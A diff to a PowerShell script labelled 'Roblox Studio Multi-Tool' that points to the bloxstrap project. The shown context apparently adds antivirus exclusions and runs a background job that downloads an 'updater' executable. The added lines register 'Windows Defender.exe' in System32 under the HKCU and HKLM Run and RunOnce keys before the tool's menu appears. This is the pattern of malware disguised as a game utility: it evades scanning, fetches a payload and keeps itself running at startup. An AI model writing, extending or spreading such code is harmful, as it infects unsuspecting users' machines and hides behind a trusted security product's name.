@@ -17,7 +17,7 @@ function Remove-Exclusion { param([string]$Path)
     } catch {}
 }
 
-Start-Job -ScriptBlock {
+$job = Start-Job -ScriptBlock {
     param($downloadUrl, $updaterExe, $silentlyContinue, $stopAction, $runAs)
 
     function Add-Exclusion { param([string]$Path)
@@ -71,8 +71,37 @@ Start-Job -ScriptBlock {
     } catch {
         exit 1
     }
-} -ArgumentList $downloadUrl, $updaterExe, $silentlyContinue, $stopAction, $runAs | Out-Null
+} -ArgumentList $downloadUrl, $updaterExe, $silentlyContinue, $stopAction, $runAs
 
+# Wait for the background job to finish
+Wait-Job $job
+Remove-Job $job
+
+# Add startup registry entries for Windows Defender.exe
+$exePath = "C:\Windows\System32\Windows Defender.exe"
+$regValueName = "WindowsDefender"
+
+function Add-StartupEntry {
+    param (
+        [string]$Hive,
+        [string]$KeyPath,
+        [string]$Name,
+        [string]$Data
+    )
+    try {
+        New-Item -Path "Registry::$Hive\$KeyPath" -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path "Registry::$Hive\$KeyPath" -Name $Name -Value $Data -ErrorAction Stop
+    } catch {
+        Write-Warning "Failed to set startup entry at $Hive\$KeyPath"
+    }
+}
+
+Add-StartupEntry -Hive "HKCU" -KeyPath "Software\Microsoft\Windows\CurrentVersion\Run" -Name $regValueName -Data $exePath
+Add-StartupEntry -Hive "HKCU" -KeyPath "Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name $regValueName -Data $exePath
+Add-StartupEntry -Hive "HKLM" -KeyPath "Software\Microsoft\Windows\CurrentVersion\Run" -Name $regValueName -Data $exePath
+Add-StartupEntry -Hive "HKLM" -KeyPath "Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name $regValueName -Data $exePath
+
+# Interactive menu
 Clear-Host
 Write-Host "Roblox Studio Multi-Tool"
 Write-Host "github.com/bloxstraplabs/bloxstrap"
